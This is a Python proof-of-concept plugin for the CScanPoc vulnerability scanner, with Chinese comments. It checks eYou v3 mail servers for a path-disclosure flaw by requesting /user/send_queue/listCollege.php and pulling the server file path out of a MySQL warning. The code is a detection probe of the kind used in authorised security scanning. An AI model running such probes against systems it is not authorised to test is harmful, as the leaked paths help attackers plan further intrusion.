# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'eYou_0000'  # 平台漏洞编号，留空
    name = 'eYou v3 /user/send_queue/listCollege.php 路径泄漏'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-05-29'  # 漏洞公布时间
    desc = '''
        eYou v3 /user/send_queue/listCollege.php 路径泄漏漏洞
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62693'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd19e4b3d-3bdf-4ee1-abae-53dff5ed2e36'
    author = '国光'  # POC编写者
    create_date = '2018-05-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+'/user/send_queue/listCollege.php'
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            res = re.compile(
                r'supplied argument is not a valid MySQL result resource in <b>(.*)</b> on line')
            match = res.findall(content)
            if match:
                if '<b>Warning</b>:' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
